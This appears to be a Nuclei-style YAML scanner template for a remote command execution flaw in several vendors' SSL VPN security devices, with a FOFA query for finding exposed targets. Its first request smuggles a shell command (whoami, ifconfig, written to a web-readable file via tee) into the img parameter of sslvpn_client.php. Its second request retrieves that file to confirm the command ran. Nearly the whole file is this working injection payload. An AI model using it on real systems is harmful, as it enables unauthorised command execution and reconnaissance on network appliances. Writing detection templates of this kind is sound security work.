flow: http(1) && http(2)
http:
- matchers:
  - part: header
    type: word
    words:
    - '200'
  - part: body
    type: word
    words:
    - tmp
  matchers-condition: and
  raw:
  - 'GET /sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami;ifconfig%60%20|tee%20/usr/local/webui/sslvpn/{{a1}}.txt|ls
    HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3

    Accept-Encoding: gzip, deflate

    DNT: 1

    Connection: close

    Upgrade-Insecure-Requests: 1

    '
- matchers:
  - part: header
    type: word
    words:
    - '200'
  raw:
  - 'GET /sslvpn/{{a1}}.txt HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3

    Accept-Encoding: gzip, deflate

    DNT: 1

    Connection: close

    Upgrade-Insecure-Requests: 1

    '
id: security_products_rce
info:
  author: rain
  description: "\u591A\u5382\u5546\u5B89\u5168\u8BBE\u5907\u8FDC\u7A0B\u547D\u4EE4\
    \u6267\u884C\u6F0F\u6D1E"
  metadata:
    fofa-query: body="/webui/images/default/default/alert_close.jpg"
  name: "\u591A\u5382\u5546\u5B89\u5168\u8BBE\u5907\u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\
    \u6F0F\u6D1E"
  reference: https://cn-sec.com/archives/2291118.html
  severity: high
  tags:
  - rce
variables:
  a1: '{{rand_base(6)}}'
